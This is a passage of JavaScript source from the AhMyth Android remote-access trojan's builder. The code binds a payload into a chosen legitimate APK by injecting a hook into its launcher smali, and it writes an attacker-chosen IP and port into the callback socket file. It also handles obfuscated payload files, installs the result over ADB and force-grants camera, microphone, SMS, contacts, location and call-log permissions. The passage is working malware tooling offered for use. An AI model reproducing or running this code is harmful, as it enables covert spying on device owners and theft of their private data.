                delayedLog('[✗] Failed to read Android Manifest!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                return;
            }

            $appCtrl.modifyManifest(data, (err, finalModifiedXml) => {
                if (err) {
                    delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                    if (err.callbackErrors) {
                        err.callbackErrors.forEach((errorMsg) => {
                            delayedLog(errorMsg, CONSTANTS.logStatus.FAIL);
                        });
                    }
                    return;
                }

                delayedLog('[→] Writing modified manifest...', CONSTANTS.logStatus.INFO);
                fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[✗] Failed to write modified manifest!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Writing.log');
                        return;
                    }

                    delayedLog('[→] Reading modified manifest...', CONSTANTS.logStatus.INFO);
                    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[✗] Failed to read modified manifest!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Reading.log');
                            return;
                        }

                        delayedLog('[→] Parsing modified manifest...', CONSTANTS.logStatus.INFO);
                        xml2js.parseString(data, (err, result) => {
                            if (err) {
                                delayedLog('[✗] Failed to parse modified manifest!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(err, 'Parsing.log');
                                return;
                            }

                            const launcherActivity = getLauncherActivity(result, apkFolder);
                            if (launcherActivity === -1) {
                                delayedLog('[✗] Cannot locate suitable main class in manifest!', CONSTANTS.logStatus.FAIL);
                                delayedLog('[ℹ] Please use a different APK as template', CONSTANTS.logStatus.INFO);
                                return;
                            }

                            delayedLog('[→] Locating main class smali file...', CONSTANTS.logStatus.INFO);
                            const launcherPath = getLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                if (err) {
                                    delayedLog('[✗] Unable to locate main class smali file!', CONSTANTS.logStatus.FAIL);
                                    delayedLog('[ℹ] Please use the "On Boot" method instead', CONSTANTS.logStatus.INFO);
                                    return;
                                } else {
                                    delayedLog(`[✓] Main class found: ${launcherPath}`, CONSTANTS.logStatus.SUCCESS);
                                }

                                delayedLog('[→] Reading main class smali file...', CONSTANTS.logStatus.INFO);
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    if (error) {
                                        delayedLog('[✗] Failed to read main class smali!', CONSTANTS.logStatus.FAIL);
                                        writeErrorLog(error, 'Reading.log');
                                        return;
                                    }

                                    const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                                    var hook = CONSTANTS.hookPoint;

                                    delayedLog('[→] Injecting AhMyth hook...', CONSTANTS.logStatus.INFO);

                                    var output = data.replace(hook, startService);
                                    fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                        if (error) {
                                            delayedLog('[✗] Failed to inject hook!', CONSTANTS.logStatus.FAIL);
                                            writeErrorLog(error, 'Writing.log');
                                            return;
                                        }

                                        delayedLog('[→] Reading target SDK version...', CONSTANTS.logStatus.INFO);
                                        fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                                            if (error) {
                                                delayedLog('[✗] Failed to read target SDK version!', CONSTANTS.logStatus.FAIL);
                                                writeErrorLog(error, 'Reading.log');
                                                return;
                                            }

                                            delayedLog('[→] Modifying target SDK version...', CONSTANTS.logStatus.INFO);

                                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                                            var repXmlSdk = data.replace(compSdkVerRegex, "$134" + '"')
                                                .replace(compSdkVerNameRegex, "$114" + '"')
                                                .replace(platVerCoRegex, "$134" + '"')
                                                .replace(platVerNameRegex, "$114" + '"');

                                            fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    delayedLog('[✗] Failed to modify target SDK!', CONSTANTS.logStatus.FAIL);
                                                    writeErrorLog(error, 'Writing.log');
                                                    return;
                                                }
                                                delayedLog('[→] Reading apktool.yml SDK version...', CONSTANTS.logStatus.INFO);
                                                fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                                    if (error) {
                                                        delayedLog('[✗] Failed to read apktool.yml!', CONSTANTS.logStatus.FAIL);
                                                        writeErrorLog(error, 'Reading.log');
                                                        return;
                                                    }
                                                    delayedLog('[→] Modifying apktool.yml SDK version...', CONSTANTS.logStatus.INFO);
                                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                                    var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                                        .replace(tarSdkRegex, "$134'");

                                                    fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                        if (error) {
                                                            delayedLog('[✗] Failed to modify apktool.yml!', CONSTANTS.logStatus.FAIL);
                                                            writeErrorLog(error, 'Writing.log');
                                                            return;
                                                        }
                                                        $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder);
                                                    });
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    };

    // fired when user click build button
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        // Clear logs for fresh build
        $appCtrl.clearLogs();
        
        // Use direct logging for immediate feedback
        const log = (msg, status) => {
            $appCtrl.Log(msg, status);
        };
        
        // Check Java version before proceeding
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                log(`[✗] ${error.message}`, CONSTANTS.logStatus.FAIL);
                log('[ℹ] AhMyth requires Java 11 for building and signing payloads', CONSTANTS.logStatus.INFO);
                return;
            } 
            
            if (javaVersion !== 11) {
                log(`[✗] Incorrect Java version: ${javaVersion}`, CONSTANTS.logStatus.FAIL);
                log('[ℹ] AhMyth requires Java 11 for building and signing payloads', CONSTANTS.logStatus.INFO);
                return;
            }
            
            // Validate IP and port inputs
            if (!ip || typeof ip !== 'string' || ip.trim() === '') {
                log('[✗] IP Address is required', CONSTANTS.logStatus.FAIL);
                log('[ℹ] Please enter a valid IP address in the Server IP field', CONSTANTS.logStatus.INFO);
                return;
            }
            
            // Clean and validate IP
            ip = ip.trim();
            var ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
            if (!ipRegex.test(ip)) {
                log('[✗] Invalid IP address format', CONSTANTS.logStatus.FAIL);
                log(`[ℹ] Received: "${ip}"`, CONSTANTS.logStatus.INFO);
                log('[ℹ] Expected format: XXX.XXX.XXX.XXX (e.g., 192.168.0.177)', CONSTANTS.logStatus.INFO);
                return;
            }
            
            // Validate port
            if (!port) {
                port = CONSTANTS.defaultPort;
                log(`[ℹ] Port not specified, using default: ${port}`, CONSTANTS.logStatus.INFO);
            } else {
                port = parseInt(port, 10);
                if (isNaN(port) || port < 1025 || port > 65535) {
                    log('[✗] Invalid port number', CONSTANTS.logStatus.FAIL);
                    log(`[ℹ] Port must be between 1025 and 65535`, CONSTANTS.logStatus.INFO);
                    return;
                }
            }

            log('[→] Starting build process...', CONSTANTS.logStatus.INFO);
            log(`    ├─ Target IP: ${ip}`, CONSTANTS.logStatus.INFO);
            log(`    └─ Target Port: ${port}`, CONSTANTS.logStatus.INFO);

            // Build the IP:PORT file path
            var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
            
            // Fallback for obfuscated file (p0.smali) if original IOSocket.smali is missing
            if (!fs.existsSync(ipPortFile)) {
                var obfuscatedFile = dir.join(CONSTANTS.ahmythApkFolderPath, 'smali', 'p0.smali');
                if (fs.existsSync(obfuscatedFile)) {
                    ipPortFile = obfuscatedFile;
                    log('[ℹ] Using obfuscated IOSocket file (p0.smali)', CONSTANTS.logStatus.INFO);
                } else {
                    // Check for other possible locations
                    var altPaths = [
                        dir.join(CONSTANTS.ahmythApkFolderPath, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
                        dir.join(CONSTANTS.ahmythApkFolderPath, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
                    ];
                    
                    for (var i = 0; i < altPaths.length; i++) {
                        if (fs.existsSync(altPaths[i])) {
                            ipPortFile = altPaths[i];
                            log(`[ℹ] Found IOSocket at alternative location: ${altPaths[i]}`, CONSTANTS.logStatus.INFO);
                            break;
                        }
                    }
                }
            }

            console.log('[AhMyth] IP:PORT file path:', ipPortFile);
            console.log('[AhMyth] File exists:', fs.existsSync(ipPortFile));
            console.log('[AhMyth] Ahmyth folder path:', CONSTANTS.ahmythApkFolderPath);
            console.log('[AhMyth] Ahmyth folder exists:', fs.existsSync(CONSTANTS.ahmythApkFolderPath));
            
            // Verify file exists before attempting to read
            if (!fs.existsSync(ipPortFile)) {
                log('[✗] IP:PORT file not found!', CONSTANTS.logStatus.FAIL);
                log(`[ℹ] Expected path: ${ipPortFile}`, CONSTANTS.logStatus.INFO);
                log(`[ℹ] Ahmyth folder: ${CONSTANTS.ahmythApkFolderPath}`, CONSTANTS.logStatus.INFO);
                log('[ℹ] Please ensure the Ahmyth folder is properly decompiled', CONSTANTS.logStatus.INFO);
                log('[ℹ] Try rebuilding the APK or check if the Factory/Ahmyth folder exists', CONSTANTS.logStatus.INFO);
                return;
            }
            
            // check if bind apk is enabled
            if (!$appCtrl.bindApk.enable) {
                log('[→] Reading IP:PORT configuration...', CONSTANTS.logStatus.INFO);
                
                // Use synchronous read for reliability
                try {
                    // Additional check before reading
                    if (!fs.existsSync(ipPortFile)) {
                        throw new Error(`File does not exist: ${ipPortFile}`);
                    }
                    
                    var data = fs.readFileSync(ipPortFile, 'utf8');
                    console.log('[AhMyth] File read successfully, length:', data.length);
                    
                    log('[→] Injecting server configuration...', CONSTANTS.logStatus.INFO);
                    
                    var startIdx = data.indexOf("http://");
                    var endIdx = data.indexOf("?model=");
                    
                    if (startIdx === -1 || endIdx === -1) {
                        log('[✗] Invalid IP:PORT file format!', CONSTANTS.logStatus.FAIL);
                        log('[ℹ] Could not find http:// or ?model= markers', CONSTANTS.logStatus.INFO);
                        return;
                    }
                    
                    var result = data.replace(data.substring(startIdx, endIdx), "http://" + ip + ":" + port);
                    
                    fs.writeFileSync(ipPortFile, result, 'utf8');
                    log('[✓] Server configuration injected', CONSTANTS.logStatus.SUCCESS);
                    
                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                    
                } catch (error) {
                    console.error('[AhMyth] Error:', error);
                    log('[✗] Failed to read/write IP:PORT file!', CONSTANTS.logStatus.FAIL);
                    log(`[ℹ] Error: ${error.message}`, CONSTANTS.logStatus.INFO);
                    writeErrorLog(error, 'IP:PORT');
                    return;
                }
            } else {
                var filePath = $appCtrl.filePath;
                if (!filePath) {
                    log('[✗] Please select an APK to bind with', CONSTANTS.logStatus.FAIL);
                    return;
                }
                if (!filePath.includes(".apk")) {
                    log('[✗] Selected file is not a valid APK', CONSTANTS.logStatus.FAIL);
                    return;
                }

                log('[→] Reading IP:PORT configuration...', CONSTANTS.logStatus.INFO);
                
                try {
                    // Verify file exists before reading
                    if (!fs.existsSync(ipPortFile)) {
                        throw new Error(`IP:PORT file not found: ${ipPortFile}`);
                    }
                    
                    var data = fs.readFileSync(ipPortFile, 'utf8');
                    
                    log('[→] Injecting server configuration...', CONSTANTS.logStatus.INFO);
                    
                    var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                    fs.writeFileSync(ipPortFile, result, 'utf8');
                    
                    log('[✓] Server configuration injected', CONSTANTS.logStatus.SUCCESS);

                    // generate a solid ahmyth apk
                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    const apkName = filePath.replace(/\\/g, "/").split("/").pop();
                    log(`[→] Decompiling "${apkName}"...`, CONSTANTS.logStatus.INFO);

                    var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

                    execCallback(decompileApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            log('[✗] Decompilation failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Decompiling');
                            return;
                        }

                        if ($appCtrl.bindApk.method == 'BOOT')
                            $appCtrl.bindOnBoot(apkFolder);
                        else if ($appCtrl.bindApk.method == 'ACTIVITY')
                            $appCtrl.bindOnActivity(apkFolder);
                    });
                    
                } catch (error) {
                    console.error('[AhMyth] Error:', error);
                    log('[✗] Failed to read/write IP:PORT file!', CONSTANTS.logStatus.FAIL);
                    log(`[ℹ] Error: ${error.message}`, CONSTANTS.logStatus.INFO);
                    writeErrorLog(error, 'IP:PORT');
                    return;
                }
            }
        });
    };

    // Install and Run on Device
    $appCtrl.installAndRun = async () => {
        if (!$appCtrl.lastBuiltApkPath) {
            $appCtrl.Log('[✗] No APK built yet', CONSTANTS.logStatus.FAIL);
            return;
        }

        const apkPath = $appCtrl.lastBuiltApkPath;
        const packageName = $appCtrl.obfuscationOptions.customPackage || 'ahmyth.mine.king.ahmyth';
        
        $appCtrl.Log('[→] Checking device connection...', CONSTANTS.logStatus.INFO);
        
        try {
            // Check devices with timeout
            $appCtrl.Log('[→] Checking ADB connection...', CONSTANTS.logStatus.INFO);
            const devicesPromise = exec('adb devices', {
                maxBuffer: 1024 * 1024,
                timeout: 10000 // 10 second timeout
            });
            
            let devices;
            try {
                devices = await Promise.race([
                    devicesPromise,
                    new Promise((_, reject) => setTimeout(() => reject(new Error('ADB timeout')), 10000))
                ]);
            } catch (error) {
                $appCtrl.Log('[✗] ADB not responding or not found in PATH', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[ℹ] Make sure ADB is installed and accessible', CONSTANTS.logStatus.INFO);
                return;
            }
            
            const deviceOutput = devices.stdout || '';
            const deviceLines = deviceOutput.trim().split('\n').filter(line => 
                line.trim() && !line.includes('List of devices')
            );
            
            if (deviceLines.length === 0 || !deviceOutput.includes('device')) {
                $appCtrl.Log('[✗] No device connected via ADB', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[ℹ] Connect your device and enable USB debugging', CONSTANTS.logStatus.INFO);
                return;
            }
            
            $appCtrl.Log(`[✓] Device detected: ${deviceLines[0].split('\t')[0]}`, CONSTANTS.logStatus.SUCCESS);

            $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
            
            // Check if app is already installed and uninstall if needed
            try {
                $appCtrl.Log('[→] Checking if app is already installed...', CONSTANTS.logStatus.INFO);
                const checkInstalled = await exec(`adb shell pm list packages | grep "${packageName}"`, {
                    maxBuffer: 1024 * 1024,
                    timeout: 5000
                });
                
                if (checkInstalled.stdout && checkInstalled.stdout.includes(packageName)) {
                    $appCtrl.Log('[ℹ] App already installed, will overwrite...', CONSTANTS.logStatus.INFO);
                    // Stop the app if running
                    try {
                        await exec(`adb shell am force-stop ${packageName}`, { timeout: 5000 });
                    } catch (e) { /* Ignore if not running */ }
                }
            } catch (e) {
                // App not installed, continue with install
                $appCtrl.Log('[ℹ] App not installed, proceeding with fresh install...', CONSTANTS.logStatus.INFO);
            }
            
            // Install with overwrite flag (-r) and grant permissions (-g)
            const installPromise = exec(`adb install -r -g "${apkPath}"`, {
                maxBuffer: 10 * 1024 * 1024, // 10MB buffer
                timeout: 60000 // 60 second timeout
            });
            
            // Add timeout wrapper
            const timeoutPromise = new Promise((_, reject) => {
                setTimeout(() => reject(new Error('Install timeout after 60 seconds')), 60000);
            });
            
            try {
                const result = await Promise.race([installPromise, timeoutPromise]);
                const output = (result.stdout || '') + (result.stderr || '');
                
                if (result.stdout) {
                    console.log('[ADB Install]', result.stdout);
                }
                if (result.stderr) {
                    console.log('[ADB Install]', result.stderr);
                }
                
                // Check for success indicators
                if (output.includes('Success') || output.includes('success') || output.includes('Performing Streamed Install')) {
                    $appCtrl.Log('[✓] APK installed/overwritten successfully', CONSTANTS.logStatus.SUCCESS);
                } else {
                    $appCtrl.Log('[✓] APK installation completed', CONSTANTS.logStatus.SUCCESS);
                }
            } catch (error) {
                // Check if it's actually a success (adb sometimes outputs to stderr)
                const errorOutput = (error.stdout || '') + (error.stderr || '');
                if (errorOutput.includes('Success') || errorOutput.includes('success')) {
                    $appCtrl.Log('[✓] APK installed/overwritten successfully', CONSTANTS.logStatus.SUCCESS);
                } else if (error.message.includes('timeout')) {
                    $appCtrl.Log('[✗] Install timeout - device may be slow or unresponsive', CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('[ℹ] Try installing manually: adb install -r -g "' + apkPath + '"', CONSTANTS.logStatus.INFO);
                    throw error;
                } else {
                    $appCtrl.Log(`[✗] Install failed: ${error.message}`, CONSTANTS.logStatus.FAIL);
                    if (error.stderr) {
                        $appCtrl.Log(`[ℹ] ADB output: ${error.stderr.substring(0, 200)}`, CONSTANTS.logStatus.INFO);
                    }
                    throw error;
                }
            }

            // Grant permissions
            $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
            const permissions = [
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_SMS',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.READ_CALL_LOG',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE',
                'android.permission.READ_PHONE_STATE',
                'android.permission.CALL_PHONE'
            ];

            for (const perm of permissions) {
                try {
                    await exec(`adb shell pm grant ${packageName} ${perm}`);
                } catch (e) { /* Ignore if already granted or failed */ }
            }
            
            // Special permissions
            try {
                await exec(`adb shell appops set ${packageName} SYSTEM_ALERT_WINDOW allow`);
                await exec(`adb shell appops set ${packageName} MANAGE_EXTERNAL_STORAGE allow`);
            } catch (e) {}

            $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);

            // Stop app first if running, then start fresh
            try {
                $appCtrl.Log('[→] Stopping app if running...', CONSTANTS.logStatus.INFO);
                await exec(`adb shell am force-stop ${packageName}`, { timeout: 5000 });
            } catch (e) {
                // Ignore if app not running
            }
            
            // Start MainService first (background service)
            try {
                $appCtrl.Log('[→] Starting background service...', CONSTANTS.logStatus.INFO);
                await exec(`adb shell am startservice ${packageName}/${packageName}.MainService`, { timeout: 5000 });
            } catch (e) {
                $appCtrl.Log('[ℹ] Service start command completed', CONSTANTS.logStatus.INFO);
            }
            
            // Run App (MainActivity)
            $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
            try {
                await exec(`adb shell am start -n ${packageName}/${packageName}.MainActivity`, { timeout: 10000 });
                $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
            } catch (error) {
                // Sometimes the app starts but command returns error, check if it's actually running
                try {
                    const checkRunning = await exec(`adb shell pidof ${packageName}`, { timeout: 5000 });
                    if (checkRunning.stdout && checkRunning.stdout.trim()) {
                        $appCtrl.Log('[✓] App is running!', CONSTANTS.logStatus.SUCCESS);
                    } else {
                        $appCtrl.Log('[ℹ] App launch command completed', CONSTANTS.logStatus.INFO);
                    }
                } catch (e) {
                    $appCtrl.Log('[ℹ] App launch attempted', CONSTANTS.logStatus.INFO);
                }
            }

        } catch (error) {
            $appCtrl.Log(`[✗] Operation failed: ${error.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    // Uninstall App
    $appCtrl.uninstallApp = async () => {
        const packageName = $appCtrl.obfuscationOptions.customPackage || 'ahmyth.mine.king.ahmyth';
        if (confirm(`Are you sure you want to uninstall ${packageName}?`)) {
            try {
                $appCtrl.Log(`[→] Uninstalling ${packageName}...`, CONSTANTS.logStatus.INFO);
                await exec(`adb uninstall ${packageName}`);
                $appCtrl.Log('[✓] Uninstalled successfully', CONSTANTS.logStatus.SUCCESS);
            } catch (error) {
                $appCtrl.Log(`[✗] Uninstall failed: ${error.message}`, CONSTANTS.logStatus.FAIL);
            }
        }
    };
});

// Function to check if Java version 11 is installed
function checkJavaVersion(callback) {
    const javaCmd = process.env.JAVA_HOME
        ? `"${path.join(process.env.JAVA_HOME, 'bin', 'java')}"`
        : 'java';
    execCallback(`${javaCmd} -version`,
        (error, stdout, stderr) => {
            if (error) {
                callback(new Error('Java is not installed or not accessible.'));
            } else {
                const versionOutput = stderr || stdout;
                const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
                if (versionMatch) {
                    const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
                    callback(null, majorVersion);
                } else {
                    callback(new Error('Java is not installed or not accessible.'));
                }
            }
        });
}

// function to delay logs with auto-reset
// Resets counter when a new build starts
function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    // Cap delay at 500ms to prevent extremely long waits
    const delay = Math.min(count * 50, 500);
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    }, delay);
}

// Reset the delayed log counter
function resetDelayedLog() {
    delayedLog.count = 0;
}

function writeErrorLog(errorMessage, errorType) {
    // Ensure log directory exists
    fs.ensureDirSync(logPath);

    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${errorMessage}\n`;

    // Write the error to the appropriate log file based on the error type
    switch (errorType) {
        case 'Parsing':
            fs.appendFileSync(dir.join(logPath, 'Parsing.log'), logEntry);
            break;

        case 'Reading':
            fs.appendFileSync(dir.join(logPath, 'Reading.log'), logEntry);
            break;

        case 'Writing':
            fs.appendFileSync(dir.join(logPath, 'Writing.log'), logEntry);
            break;

        case 'Building':
            fs.appendFileSync(dir.join(logPath, 'Building.log'), logEntry);
            break;

        case 'Signing':
            fs.appendFileSync(dir.join(logPath, 'Signing.log'), logEntry);
            break;

        case 'Decompiling':
            fs.appendFileSync(dir.join(logPath, 'Decompiling.log'), logEntry);
            break;

        case 'IP:PORT':
            fs.appendFileSync(dir.join(logPath, 'IP-PORT.log'), logEntry);
            break;

        case 'Copying':
            fs.appendFileSync(dir.join(logPath, 'Copying.log'), logEntry);
            break;

        default:
            // If the error type is not recognized, write it to a generic error log file
            fs.appendFileSync(dir.join(logPath, 'Error.log'), logEntry);
            break;
    }
}

function getLauncherActivity(manifest) {

    delayedLog('[→] Searching for hookable activity class...', CONSTANTS.logStatus.INFO);

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[✓] Main app class identified for hooking', CONSTANTS.logStatus.SUCCESS);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[✓] Main launcher activity identified', CONSTANTS.logStatus.SUCCESS);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[✓] Main launcher activity alias identified', CONSTANTS.logStatus.SUCCESS);
        return targetActivityName + '.smali';
    }

    return -1;

}

function getLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
        .on('data', (entry) => {
            found = true;
            var {
                path, stats: { }
            } = entry;
            var output = `${JSON.stringify(path)}`;
            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
        })
        .on('end',
            () => {
                if (!found) {
                    callback('[✗] Unable to locate hookable main class!');
                    callback('[ℹ] Please use the "On Boot" method instead');
                } else {
                    callback(null, launcherPath);
                }
            })
        .on('error',
            (err) => {
                callback(err);
            });
}
